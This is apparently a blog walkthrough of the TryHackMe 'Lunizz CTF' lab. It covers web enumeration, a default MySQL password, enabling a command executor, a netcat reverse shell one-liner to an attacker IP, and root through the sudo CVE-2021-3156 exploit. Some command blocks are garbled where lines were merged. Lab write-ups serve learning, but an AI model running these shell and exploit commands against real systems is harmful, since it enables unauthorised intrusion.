---
title: "Lunizz CTF Tryhackme Writeup 905b3a076ea4"
platform: Medium
original_file: 2024-08-20_Lunizz-CTF-Tryhackme-Writeup-905b3a076ea4.md
---

# Lunizz CTF Tryhackme Writeup 905b3a076ea4

::: {}
# Lunizz CTF Tryhackme Writeup {#lunizz-ctf-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Lunizz CTF"
:::

::::::: {.section .e-content field="body"}
:::::: {#917b .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Lunizz CTF Tryhackme Writeup {#fd03 .graf .graf--h3 .graf--leading .graf--title name="fd03"}

**This is a Writeup of Tryhackme room "Lunizz CTF"**

<figure id="7832" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0fcQXy-3WNTxGR1G.png"
class="graf-image" data-image-id="0*0fcQXy-3WNTxGR1G.png"
data-width="514" data-height="282" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/lunizzctfnd](https://tryhackme.com/room/lunizzctfnd){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/lunizzctfnd"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

### Enumeration {#ee7d .graf .graf--h3 .graf-after--p name="ee7d"}

[**Rustscan**](https://github.com/RustScan/RustScan/releases){.markup--anchor
.markup--p-anchor
data-href="https://github.com/RustScan/RustScan/releases"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="5553" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TKbC5FoMebQ8ZYdT.png"
class="graf-image" data-image-id="0*TKbC5FoMebQ8ZYdT.png"
data-width="650" data-height="504" />
</figure>

### Directory Brute Forcing with Gubuster {#6067 .graf .graf--h3 .graf-after--figure name="6067"}

We saw port 80 is open, so let's brute force the directories and files
which are exposed by this web server using ffuf:

``` {#8457 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u http://10.10.106.159/ -w directory-list-2.3-medium.txt -x .php,.html,.txt
```

<figure id="2566" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*iQObkV3eYA2krDpB.png"
class="graf-image" data-image-id="0*iQObkV3eYA2krDpB.png"
data-width="875" data-height="419" />
</figure>

``` {#997c .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.106.159/whatever
```

The "whatever" directory looks interesting as this indicates that we can
run commands on the server,but the mode looks to be disabled:

<figure id="30a7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZfsEzZV98bxuQeDM.png"
class="graf-image" data-image-id="0*ZfsEzZV98bxuQeDM.png"
data-width="517" data-height="257" />
</figure>

/instructions.txt

**Q.1:** **What is the default password for MySQL**

<figure id="2419" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ifaAaIO-0SueTeet.png"
class="graf-image" data-image-id="0*ifaAaIO-0SueTeet.png"
data-width="802" data-height="322" />
</figure>

As we can see we found a user **runcheck** for mysql and a corresponding
default password.Lets connect to the database using this user and
password:

**Login into Mysql**

<figure id="98a5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JmMI9MIA7wwLKy8S.png"
class="graf-image" data-image-id="0*JmMI9MIA7wwLKy8S.png"
data-width="656" data-height="271" />
</figure>

We connect to the database let's explore the database

<figure id="94b6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JGBpWnGXV7SyNCkp.png"
class="graf-image" data-image-id="0*JGBpWnGXV7SyNCkp.png"
data-width="428" data-height="411" />
</figure>

**Q.2:** **I can't run commands, there must be a MySQL column that
controls command executor**

<figure id="8151" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*HazDU6dT7kHRfOoc.png"
class="graf-image" data-image-id="0*HazDU6dT7kHRfOoc.png"
data-width="435" data-height="386" />
</figure>

From the Table "runcheck", we were able to find the name of the column
which looks to be controlling the command executer as it's value is 0
currently. We can update this value to 1 and check if we can exeute
something.

<figure id="cfb1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bR_QbKNtw7IobtA2.png"
class="graf-image" data-image-id="0*bR_QbKNtw7IobtA2.png"
data-width="481" data-height="136" />
</figure>

Now as the colums value is update, lets check if we can execute
commands:

<figure id="513a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*l-HUEM737wlSX2YO.png"
class="graf-image" data-image-id="0*l-HUEM737wlSX2YO.png"
data-width="545" data-height="242" />
</figure>

**Q.3:** **a folder shouldn't be.**

Lets execute "**ls -lrt /**" and we will get our answer of the above
question.

<figure id="959c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hYWxFAyO1b8QREVS.png"
class="graf-image" data-image-id="0*hYWxFAyO1b8QREVS.png"
data-width="780" data-height="516" />
</figure>

### Reverse Shell {#09cd .graf .graf--h3 .graf-after--figure name="09cd"}

From the command executor we can also get a reverse shell now.Execute
the following from the executor after staring a netcat listener on your
kali/attacker machine:

``` {#59e5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.12.26 4444 >/tmp/f
```

<figure id="b1ea" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*6IT8OTjE2wvlK41N.png"
class="graf-image" data-image-id="0*6IT8OTjE2wvlK41N.png"
data-width="415" data-height="133" />
</figure>

<figure id="dac1" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*jErnoL9Nj_xl2zCp.png"
class="graf-image" data-image-id="0*jErnoL9Nj_xl2zCp.png"
data-width="622" data-height="204" />
</figure>

**Upgrade shell**

``` {#4c0d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/nullexport TERM=xterm
control+z to background
stty raw -echo;fg
```

<figure id="7c20" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*GFu3VeORvmaHZSE3.png"
class="graf-image" data-image-id="0*GFu3VeORvmaHZSE3.png"
data-width="622" data-height="389" />
</figure>

Exploring the directory **/proct** which we found earlier and also
highlighted by LinPEAS we found a python file with the following code:

<figure id="dfbd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dgwX1boX-3VGj7b6.png"
class="graf-image" data-image-id="0*dgwX1boX-3VGj7b6.png"
data-width="875" data-height="273" />
</figure>

i try to crack password but bad luck

<figure id="92b8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tG8VQyHTDk66gZN-.png"
class="graf-image" data-image-id="0*tG8VQyHTDk66gZN-.png"
data-width="414" data-height="280" />
</figure>

It seems like this version of `sudo`{.markup--code .markup--p-code} is
vulnerable to the
[CVE-2021-3156](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit){.markup--anchor
.markup--p-anchor
data-href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit"
rel="noopener ugc nofollow noopener" target="_blank"} vulnerability.
This exploit abuses all sudo versions lower than version
`1.8.31`{.markup--code .markup--p-code}. This vulnerability gives you
`root`{.markup--code .markup--p-code} privileges right away! We should
also check which Ubuntu version is installed by running:
`lsb_release -a`{.markup--code .markup--p-code}. Running this command
should give you the following output:

Now that we know this box is vulnerable to `CVE-2021-3156`{.markup--code
.markup--p-code}, let's try to run an exploit! I found a script on
[GitHub](https://github.com/blasty/CVE-2021-3156.git){.markup--anchor
.markup--p-anchor
data-href="https://github.com/blasty/CVE-2021-3156.git"
rel="noopener ugc nofollow noopener" target="_blank"} that exploits the
vulnerability mentioned above. Run the following code:

``` {#6ad1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
git clone https://github.com/blasty/CVE-2021-3156.gittar - cvzf sudo.tar.gz CVE-2021-3156/
python3 -m http.server
```

<figure id="459e" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Sn425_O-hYWDrUwc.png"
class="graf-image" data-image-id="0*Sn425_O-hYWDrUwc.png"
data-width="782" data-height="274" />
</figure>

Then on the box run:

<figure id="c697" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*38DwA4Et9tYTPfmq.png"
class="graf-image" data-image-id="0*38DwA4Et9tYTPfmq.png"
data-width="598" data-height="277" />
</figure>

``` {#10d9 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
```

We are running on Ubuntu `18.04`{.markup--code .markup--p-code} with
`sudo`{.markup--code .markup--p-code} version `1.8.21`{.markup--code
.markup--p-code}. That is why we have to run the `0`{.markup--code
.markup--p-code} option. Do so by running:

``` {#6d11 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="wasm"}
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

<figure id="a33a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*XcviCGRlzwnqXFi7.png"
class="graf-image" data-image-id="0*XcviCGRlzwnqXFi7.png"
data-width="875" data-height="252" />
</figure>

The `root.txt`{.markup--code .markup--p-code} flag is located at
`/root/root.txt`{.markup--code .markup--p-code}. The
`user.txt`{.markup--code .markup--p-code} flag is located at
`/home/adam/user.txt`{.markup--code .markup--p-code}.

This box was different from other boxes I have rooted before. The
questions were a bit misleading since we exploited a vulnerability
instead of brute-forcing. In the end, the `CVE-2021-3156`{.markup--code
.markup--p-code} vulnerability helped us `root`{.markup--code
.markup--p-code} the box.

**Q.4: hi adam, do you remember our place?**

<figure id="fc8e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*LFF1h09WaRaFCsLn.png"
class="graf-image" data-image-id="0*LFF1h09WaRaFCsLn.png"
data-width="875" data-height="274" />
</figure>

Open this link you will get map

``` {#9338 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
https://www.google.com/maps/@68.5090469,27.481808,2a,75y,313.8h,103.6t/data=!3m7!1e1!3m5!1skJPO1zlKRtMAAAQZLDcQIQ!2e0!3e2!7i10000!8i5000
```

> ***Answer: Northern Lights***

<figure id="eb78" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*anBsHzg_VvC745c8.png"
class="graf-image" data-image-id="0*anBsHzg_VvC745c8.png"
data-width="406" data-height="103" />
</figure>

<figure id="af5b" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*YMr6VHMX0co8rHjQ.png"
class="graf-image" data-image-id="0*YMr6VHMX0co8rHjQ.png"
data-width="597" data-height="85" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#1e09 .graf .graf--h3 .graf-after--figure name="1e09"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#72c9 .graf .graf--h3 .graf-after--p name="72c9"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 20, 2024](https://medium.com/p/905b3a076ea4).

[Canonical
link](https://medium.com/@bevijaygupta/lunizz-ctf-tryhackme-writeup-905b3a076ea4){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
